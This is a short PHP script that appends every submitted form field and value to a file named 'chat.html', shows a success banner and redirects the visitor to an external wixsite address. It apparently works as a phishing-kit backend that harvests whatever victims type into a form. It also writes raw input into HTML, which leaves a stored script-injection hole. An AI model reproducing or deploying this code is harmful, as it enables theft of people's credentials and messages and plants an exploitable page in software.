<?php
header ('Location: guddumodok.wixsite.com/guddumodok');
$handle = fopen("chat.html", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
echo "<body BGCOLOR='red'><FONT COLOR='BLUE'><h1>SEND MESSAGE SUCCESSFULL</H1></BODY>";
echo "<script> location.href='send.html'; </script>";
        exit;
?>